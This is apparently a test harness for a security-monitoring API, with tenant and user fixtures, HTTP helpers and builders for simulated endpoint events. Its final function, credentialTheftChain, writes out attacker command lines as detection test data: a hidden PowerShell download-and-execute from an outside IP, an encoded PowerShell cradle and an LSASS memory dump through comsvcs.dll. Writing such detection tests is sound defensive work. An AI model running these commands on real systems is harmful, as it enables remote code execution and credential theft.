/**
 * Test harness: builds isolated API instances against the real test database, provisions
 * tenants / users through the privileged path (exactly like the platform bootstrap does) and
 * drives the HTTP surface with `app.inject` — every assertion goes through the real auth,
 * RBAC, RLS and audit stack.
 */
import { randomUUID } from "node:crypto";
import type { IngestEvent, PlanKey, RoleKey } from "@bloody/contracts";
import type { FastifyInstance } from "fastify";
import type pg from "pg";
import { buildApp, type AppDeps, type BuiltApp } from "../app.js";
import { CSRF_COOKIE, CSRF_HEADER, SESSION_COOKIE } from "../auth/types.js";
import { loadConfig, type AppConfig } from "../config.js";
import { Database, createPool } from "../db/pool.js";
import { hashPassword } from "../security/passwords.js";
import { testAppRolePassword, testDatabaseUrl } from "./db-url.js";

/* eslint-disable @typescript-eslint/no-explicit-any */
export type Json = any;

export const TEST_PASSWORD = "Bl00dy-Test-Passw0rd!";
/** Fixed 32-byte test key so secrets encrypted by one app instance decrypt in another. */
export const TEST_ENCRYPTION_KEY = Buffer.alloc(32, 7).toString("base64");
export const TEST_JWT_SECRET = "bloody-test-jwt-secret-0123456789abcdef-0123456789";

export interface TestApp extends BuiltApp {
  config: AppConfig;
  db: Database;
  /** Superuser pool (bypasses RLS) — fixtures and direct assertions only. */
  privileged: pg.Pool;
  close(): Promise<void>;
}

export function testConfig(overrides: Record<string, string> = {}): AppConfig {
  return loadConfig({
    NODE_ENV: "test",
    DATABASE_URL: testDatabaseUrl(),
    BLOODY_APP_DB_PASSWORD: testAppRolePassword(),
    JWT_SECRET: TEST_JWT_SECRET,
    ENCRYPTION_KEY: TEST_ENCRYPTION_KEY,
    LOG_LEVEL: "silent",
    LOGIN_RATE_LIMIT_PER_MINUTE: "10000",
    RATE_LIMIT_PER_MINUTE: "1000000",
    DATABASE_POOL_MAX: "8",
    ...overrides,
  });
}

export async function createTestApp(opts: { env?: Record<string, string>; deps?: Partial<Omit<AppDeps, "config" | "db">> } = {}): Promise<TestApp> {
  const config = testConfig(opts.env);
  const privileged = createPool({ connectionString: config.database.privilegedUrl, max: 4, applicationName: "bloody-test-privileged" });
  const appPool = createPool({ connectionString: config.database.appUrl, max: config.database.poolMax, applicationName: "bloody-test-app" });
  const db = new Database(appPool, privileged);
  const built = await buildApp({ config, db, startPipeline: true, ...opts.deps });
  await built.app.ready();
  return {
    ...built,
    config,
    db,
    privileged,
    close: async () => {
      await built.app.close();
      await db.close();
    },
  };
}

// ─── Fixtures (privileged bootstrap path) ───────────────────────────────────

let hashed: Promise<string> | null = null;
/** One Argon2id hash of TEST_PASSWORD per test file (hashing is deliberately slow). */
export function testPasswordHash(): Promise<string> {
  hashed ??= hashPassword(TEST_PASSWORD);
  return hashed;
}

export const uniq = (prefix: string): string => `${prefix}-${randomUUID().replace(/-/g, "").slice(0, 10)}`;

export interface TestUser {
  id: string;
  tenantId: string;
  email: string;
}

export interface TestTenant {
  tenantId: string;
  slug: string;
  orgIds: string[];
  admin: TestUser;
}

export interface Binding {
  role: RoleKey;
  organizationId: string | null;
}

export async function createUser(
  t: TestApp,
  tenantId: string,
  opts: { roles: Binding[]; organizationId?: string | null; email?: string; withPassword?: boolean; displayName?: string },
): Promise<TestUser> {
  const email = opts.email ?? `${uniq("user")}@example.test`;
  const hash = opts.withPassword === false ? null : await testPasswordHash();
  const client = await t.privileged.connect();
  try {
    await client.query("BEGIN");
    const { rows } = await client.query<{ id: string }>(
      "INSERT INTO users (tenant_id, organization_id, email, display_name, status) VALUES ($1, $2, $3, $4, $5) RETURNING id",
      [tenantId, opts.organizationId ?? null, email, opts.displayName ?? email.split("@")[0], hash ? "active" : "invited"],
    );
    const id = rows[0]!.id;
    if (hash) await client.query("INSERT INTO user_credentials (user_id, tenant_id, organization_id, password_hash) VALUES ($1, $2, $3, $4)", [id, tenantId, opts.organizationId ?? null, hash]);
    for (const b of opts.roles) {
      await client.query("INSERT INTO role_bindings (tenant_id, principal_kind, principal_id, role, organization_id) VALUES ($1, 'user', $2, $3, $4)", [tenantId, id, b.role, b.organizationId]);
    }
    await client.query("COMMIT");
    return { id, tenantId, email };
  } catch (err) {
    await client.query("ROLLBACK");
    throw err;
  } finally {
    client.release();
  }
}

export async function createTenant(t: TestApp, opts: { kind?: "mssp" | "enterprise"; plan?: PlanKey; orgs?: number; name?: string } = {}): Promise<TestTenant> {
  const slug = uniq("t");
  const { rows } = await t.privileged.query<{ id: string }>("INSERT INTO accounts (name, slug, kind, plan) VALUES ($1, $2, $3, $4) RETURNING id", [
    opts.name ?? `Tenant ${slug}`,
    slug,
    opts.kind ?? "mssp",
    opts.plan ?? "mssp",
  ]);
  const tenantId = rows[0]!.id;
  const orgIds: string[] = [];
  for (let i = 1; i <= (opts.orgs ?? 2); i++) {
    const org = await t.privileged.query<{ id: string }>("INSERT INTO organizations (tenant_id, name, slug, retention_days) VALUES ($1, $2, $3, 90) RETURNING id", [tenantId, `Customer ${i} of ${slug}`, `org-${i}`]);
    orgIds.push(org.rows[0]!.id);
  }
  const admin = await createUser(t, tenantId, { roles: [{ role: "mssp_admin", organizationId: null }], displayName: "Tenant Admin" });
  return { tenantId, slug, orgIds, admin };
}

// ─── HTTP helpers ───────────────────────────────────────────────────────────

export interface Session {
  userId: string;
  token: string;
  sessionCookie: string;
  csrfCookie: string;
  csrfToken: string;
}

export type Auth = { token: string } | { apiKey: string } | { session: Session; csrf?: string | false; origin?: string } | null;

export interface Res<T = Json> {
  status: number;
  body: T;
  headers: Record<string, string | string[] | number | undefined>;
  cookies: Array<{ name: string; value: string; httpOnly?: boolean; secure?: boolean; sameSite?: string; path?: string; expires?: Date; maxAge?: number }>;
  text: string;
}

const UNSAFE = new Set(["POST", "PUT", "PATCH", "DELETE"]);

export async function call<T = Json>(
  app: FastifyInstance,
  method: "GET" | "POST" | "PUT" | "PATCH" | "DELETE",
  url: string,
  opts: { auth?: Auth; body?: unknown; headers?: Record<string, string> } = {},
): Promise<Res<T>> {
  const headers: Record<string, string> = { "user-agent": "bloody-api-tests", ...(opts.headers ?? {}) };
  const auth = opts.auth ?? null;
  if (auth && "token" in auth) headers.authorization = `Bearer ${auth.token}`;
  else if (auth && "apiKey" in auth) headers.authorization = `Bearer ${auth.apiKey}`;
  else if (auth && "session" in auth) {
    headers.cookie = `${SESSION_COOKIE}=${auth.session.sessionCookie}; ${CSRF_COOKIE}=${auth.session.csrfCookie}`;
    if (UNSAFE.has(method) && auth.csrf !== false) headers[CSRF_HEADER] = auth.csrf ?? auth.session.csrfToken;
    if (auth.origin) headers.origin = auth.origin;
  }
  const res = await app.inject({
    method,
    url: url.startsWith("/api/") ? url : `/api/v1${url}`,
    headers,
    ...(opts.body !== undefined ? { payload: opts.body as never } : {}),
  });
  const type = String(res.headers["content-type"] ?? "");
  const body = (type.includes("json") && res.body.length > 0 ? JSON.parse(res.body) : res.body) as T;
  return { status: res.statusCode, body, headers: res.headers as Res["headers"], cookies: res.cookies as Res["cookies"], text: res.body };
}

/** Bound client: `api(app, auth).get("/incidents")`. */
export function api(app: FastifyInstance, auth: Auth) {
  return {
    get: <T = Json>(url: string, headers?: Record<string, string>) => call<T>(app, "GET", url, { auth, ...(headers ? { headers } : {}) }),
    post: <T = Json>(url: string, body?: unknown, headers?: Record<string, string>) => call<T>(app, "POST", url, { auth, body: body ?? {}, ...(headers ? { headers } : {}) }),
    patch: <T = Json>(url: string, body?: unknown) => call<T>(app, "PATCH", url, { auth, body: body ?? {} }),
    delete: <T = Json>(url: string) => call<T>(app, "DELETE", url, { auth }),
  };
}

export async function login(app: FastifyInstance, email: string, password = TEST_PASSWORD): Promise<Session> {
  const res = await call(app, "POST", "/auth/login", { body: { email, password } });
  if (res.status !== 200) throw new Error(`login ${email} failed: ${res.status} ${res.text}`);
  const session = res.cookies.find((c) => c.name === SESSION_COOKIE);
  const csrf = res.cookies.find((c) => c.name === CSRF_COOKIE);
  if (!session || !csrf) throw new Error("login did not set the session cookies");
  return { userId: res.body.principal.id, token: res.body.token, sessionCookie: session.value, csrfCookie: csrf.value, csrfToken: res.body.csrfToken };
}

/** Log in and return a bearer-authenticated client. */
export async function asUser(app: FastifyInstance, user: TestUser) {
  const session = await login(app, user.email);
  return { session, client: api(app, { token: session.token }) };
}

export async function createApiKey(app: FastifyInstance, adminToken: string, body: { name?: string; organizationId: string | null; roles?: RoleKey[] }): Promise<{ id: string; key: string }> {
  const res = await call(app, "POST", "/api-keys", { auth: { token: adminToken }, body: { name: body.name ?? uniq("key"), organizationId: body.organizationId, roles: body.roles ?? ["api_service"] } });
  if (res.status !== 201) throw new Error(`api key creation failed: ${res.status} ${res.text}`);
  return { id: res.body.apiKey.id, key: res.body.key };
}

// ─── Canonical event builders ───────────────────────────────────────────────

export const minutesAgo = (m: number, now = Date.now()): string => new Date(now - m * 60_000).toISOString();

const endpointSource = (host: string) => ({ kind: "endpoint" as const, product: "wazuh", sensorId: `wazuh-agent:${host}` });

export function processEvent(host: string, at: string, p: { path: string; cmd: string; parent?: string; user?: string; sha256?: string }): IngestEvent {
  return {
    id: randomUUID(),
    timestamp: at,
    source: endpointSource(host),
    category: "process",
    eventType: "process_start",
    action: "start",
    asset: { hostname: host, os: "Windows 11 Enterprise 23H2" },
    ...(p.user ? { user: { name: p.user, domain: "CORP" } } : {}),
    process: {
      name: p.path.split("\\").pop()!,
      path: p.path,
      commandLine: p.cmd,
      ...(p.sha256 ? { hashSha256: p.sha256 } : {}),
      ...(p.parent ? { parent: { path: p.parent, name: p.parent.split("\\").pop()! } } : {}),
    },
    provenance: { adapter: "bloody-tests", adapterVersion: "1", receivedAt: new Date().toISOString() },
  };
}

export function dnsEvent(host: string, at: string, srcIp: string, query: string): IngestEvent {
  return {
    id: randomUUID(),
    timestamp: at,
    source: { kind: "network", product: "zeek", sensorId: "zeek-test" },
    category: "dns",
    eventType: "dns_query",
    asset: { hostname: host },
    network: { srcIp, dstIp: "10.0.0.2", dstPort: 53, protocol: "udp", dnsQuery: query },
    provenance: { adapter: "bloody-tests", adapterVersion: "1", receivedAt: new Date().toISOString() },
  };
}

export const POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
export const WINWORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";

/** Phishing → encoded PowerShell → LSASS dump on one host: three built-in detections. */
export function credentialTheftChain(host: string, now = Date.now()): IngestEvent[] {
  return [
    processEvent(host, minutesAgo(30, now), { path: POWERSHELL, cmd: "powershell -w hidden -c iwr http://198.51.100.23/inv.ps1|iex", parent: WINWORD, user: "jdoe" }),
    processEvent(host, minutesAgo(29, now), {
      path: POWERSHELL,
      cmd: "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      parent: POWERSHELL,
      user: "jdoe",
    }),
    processEvent(host, minutesAgo(20, now), {
      path: "C:\\Windows\\System32\\rundll32.exe",
      cmd: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Users\\Public\\debug.bin full",
      parent: POWERSHELL,
      user: "jdoe",
    }),
  ];
}
